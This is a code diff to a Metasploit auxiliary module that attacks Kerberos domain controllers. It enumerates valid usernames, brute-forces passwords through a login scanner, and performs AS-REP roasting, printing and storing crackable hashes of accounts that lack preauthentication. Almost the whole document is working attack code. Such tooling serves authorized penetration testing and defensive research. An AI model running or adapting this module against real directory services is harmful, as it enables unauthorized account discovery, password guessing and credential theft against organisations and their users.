@@ -3,9 +3,14 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/kerberos'
+
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::Kerberos::Client
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
 
   def initialize(info = {})
     super(
@@ -18,7 +23,8 @@ class MetasploitModule < Msf::Auxiliary
         },
         'Author' => [
           'Matt Byrne <attackdebris[at]gmail.com>', # Original Metasploit module
-          'alanfoster' # Enhancements
+          'alanfoster', # Enhancements
+          'sjanusz-r7' # Enhancements
         ],
         'References' => [
           ['URL', 'https://nmap.org/nsedoc/scripts/krb5-enum-users.html']
@@ -29,84 +35,90 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('DOMAIN', [ true, 'The Domain Eg: demo.local' ]),
-        OptPath.new(
-          'USER_FILE',
-          [true, 'Files containing usernames, one per line', nil]
-        )
-      ],
-      self.class
+        OptString.new('DOMAIN', [ true, 'The Domain Eg: demo.local' ])
+      ]
     )
-  end
 
-  def user_list
-    if File.readable? datastore['USER_FILE']
-      users = File.new(datastore['USER_FILE']).readlines(chomp: true)
-      users.each(&:downcase!)
-      users.uniq!
-    else
-      raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
-    end
-    users
+    register_advanced_options(
+      [
+        OptInt.new('ConnectTimeout', [ true, 'Maximum number of seconds to establish a TCP connection', 20])
+      ]
+    )
   end
 
   def run
     domain = datastore['DOMAIN'].upcase
     print_status("Using domain: #{domain} - #{peer}...")
 
-    pre_auth = []
-    pre_auth << build_pa_pac_request
-    pre_auth
+    cred_collection = build_credential_collection(
+      username: datastore['USERNAME'],
+      password: datastore['PASSWORD'],
+      realm:  domain,
+    )
 
-    user_list.each do |user|
-      next if user.empty?
+    # If there are credential pairs due to no password/password list being supplied, default to using nil passwords to attempt AS-REP roasting
+    if cred_collection.empty?
+      cred_collection.nil_passwords = true
+    end
 
-      begin
-        res = send_request_as(
-          client_name: user.to_s,
-          server_name: "krbtgt/#{domain}",
-          realm: domain.to_s,
-          pa_data: pre_auth
-        )
-      rescue ::EOFError => e
-        print_error("#{peer} - User: #{user.inspect} - EOF Error #{e.message}. Aborting...")
-        elog(e)
-        # Stop further requests entirely
-        return false
-      rescue Rex::Proto::Kerberos::Model::Error::KerberosDecodingError => e
-        print_error("#{peer} - User: #{user.inspect} - Decoding Error -  #{e.message}. Aborting...")
-        elog(e)
-        # Stop further requests entirely
-        return false
-      end
+    attempted_users = Set.new
+    scanner = ::Metasploit::Framework::LoginScanner::Kerberos.new(
+      host: self.rhost,
+      port: self.rport,
+      server_name: "krbtgt/#{domain}",
+      cred_details: cred_collection,
+      stop_on_success: datastore['STOP_ON_SUCCESS'],
+      connection_timeout: datastore['ConnectTimeout'],
+      framework: framework,
+      framework_module: self,
+    )
 
-      case res.msg_type
-      when Rex::Proto::Kerberos::Model::AS_REP
-        hash = format_asrep_to_john_hash(res)
+    scanner.scan! do |result|
+      user = result.credential.public
+      password = result.credential.private
+      peer = result.host
+      proof = result.proof
 
-        # Accounts that have 'Do not require Kerberos preauthentication' enabled, will receive an ASREP response with a ticket present
-        print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
-        report_cred(
-          user: user,
-          asrep: hash
-        )
-      when Rex::Proto::Kerberos::Model::KRB_ERROR
-        if res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
+      case result.status
+      when Metasploit::Model::Login::Status::SUCCESSFUL
+        hash = format_as_rep_to_john_hash(proof.as_rep)
+
+        # Accounts that have 'Do not require Kerberos preauthentication' enabled, will receive an ASREP response with a
+        # ticket present without requiring a password
+        if !proof.preauth_required
+          print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
+        else
+          print_good("#{peer} - User found: #{user.inspect} with password #{password}. Hash: #{hash}")
+        end
+
+        report_cred(user: user, password: password, asrep: hash)
+      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+        print_error("#{peer} - User: #{user.inspect} - Unable to connect - #{proof}")
+
+      when Metasploit::Model::Login::Status::INCORRECT, Metasploit::Model::Login::Status::INCORRECT_PUBLIC_PART
+        if proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_WRONG_REALM
+          print_error("#{peer} - User: #{user.inspect} - #{proof}. Domain option may be incorrect. Aborting...")
+          # Stop further requests entirely
+          break
+        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
           print_good("#{peer} - User: #{user.inspect} is present")
           report_cred(user: user)
-        elsif res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_CLIENT_REVOKED
+        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_FAILED
+          # If we haven't seen this user before, output that the user is present
+          if !attempted_users.include?(user)
+            attempted_users << user
+            print_good("#{peer} - User: #{user.inspect} is present")
+            report_cred(user: user)
+          else
+            vprint_status("#{peer} - User: #{user.inspect} wrong password #{password}")
+          end
+        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_CLIENT_REVOKED
           print_error("#{peer} - User: #{user.inspect} account disabled or locked out")
-        elsif res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_C_PRINCIPAL_UNKNOWN
+        elsif proof.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_C_PRINCIPAL_UNKNOWN
           vprint_status("#{peer} - User: #{user.inspect} user not found")
-        elsif res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_WRONG_REALM
-          print_error("#{peer} - User: #{user.inspect} - #{res.error_code}. Domain option may be incorrect. Aborting...")
-          # Stop further requests entirely
-          return false
         else
-          vprint_status("#{peer} - User: #{user.inspect} - #{res.error_code}")
+          vprint_status("#{peer} - User: #{user.inspect} - #{proof}")
         end
-      else
-        vprint_status("#{peer} - User: #{user.inspect} - #{res.error_code}. Unknown response #{res.msg_type.inspect}")
       end
     end
   end
@@ -130,7 +142,13 @@ class MetasploitModule < Msf::Auxiliary
       module_fullname: fullname
     }.merge(service_data)
 
-    if opts[:asrep]
+    # TODO: Confirm if we should store both passwords and asrep accounts as two separate logins or not
+    if opts[:password]
+      credential_data.merge!(
+        private_data: opts[:password],
+        private_type: :password
+      )
+    elsif opts[:asrep]
       credential_data.merge!(
         private_data: opts[:asrep],
         private_type: :nonreplayable_hash,
@@ -144,11 +162,5 @@ class MetasploitModule < Msf::Auxiliary
     }.merge(service_data)
 
     create_credential_login(login_data)
-  end
-
-  # @param [Rex::Proto::Kerberos::Model::KdcResponse] asrep The krb5 asrep response
-  # @return [String] A valid string format which can be cracked offline
-  def format_asrep_to_john_hash(asrep)
-    "$krb5asrep$#{asrep.enc_part.etype}$#{asrep.cname.name_string.join('/')}@#{asrep.ticket.realm}:#{asrep.enc_part.cipher[0...16].unpack1('H*')}$#{asrep.enc_part.cipher[16..].unpack1('H*')}"
   end
 end
